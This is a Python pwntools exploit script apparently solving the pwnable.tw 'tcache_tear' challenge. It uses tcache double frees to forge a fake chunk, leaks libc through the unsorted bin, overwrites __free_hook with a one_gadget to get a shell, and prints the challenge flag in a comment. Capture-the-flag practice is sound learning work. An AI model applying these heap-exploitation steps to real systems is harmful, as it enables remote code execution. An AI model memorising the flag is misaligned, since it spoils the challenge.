#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_tear_patched", checksec=False)
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10207)
    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    return r
r = conn()
input()
def create(size, data):
    r.sendlineafter(b'Your choice :', b'1')
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendlineafter(b'Data:', data)
def free():
    r.sendlineafter(b'Your choice :', b'2')
def view():
    r.sendlineafter(b'Your choice :', b'3')
# Create fake chunk in Name
name_addr = 0x602060
r.sendlineafter(b'Name:', p64(0) + p64(0x501))
create(0x40, b'A')
free()
free()
create(0x40, p64(name_addr+0x500))
# pause()
create(0x40, p64(0))
# Create small chunks to bypass check valid and limit the size of fake chunk
create(0x40, p64(0) + p64(0x21) + p64(0)*3 + p64(0x21))
# pause()
# Put the fake chunk into unsorted bin.
create(0x30, b'A')
free()
free()
# pause()
create(0x30, p64(name_addr + 0x10))
# pause()
create(0x30 ,b'\0')
# pause()
create(0x30, b'\0')
# pause()
free()
# Leak libc
view()
r.recvuntil(b'Name :')
r.recv(16)
libc_leak = u64(r.recv(6) + b'\0\0')
libc.address = libc_leak -  0x3ebca0
info('Libc leak: ' + hex(libc_leak))
info('Libc address: ' + hex(libc.address))
free_hook = libc.sym['__free_hook']
info('Libc free_hook: ' + hex(free_hook))
# Overwrite free_hook
onegadget = libc.address + 0x4f322
create(0x60, b'A')
free()
free()
create(0x60, p64(free_hook))
create(0x60, b'\0')
pause()
create(0x60, p64(onegadget))
pause()
# Trigger free_hook
free()
pause()


# FLAG{tc4ch3_1s_34sy_f0r_y0u}
# good luck pwning :)

r.interactive()


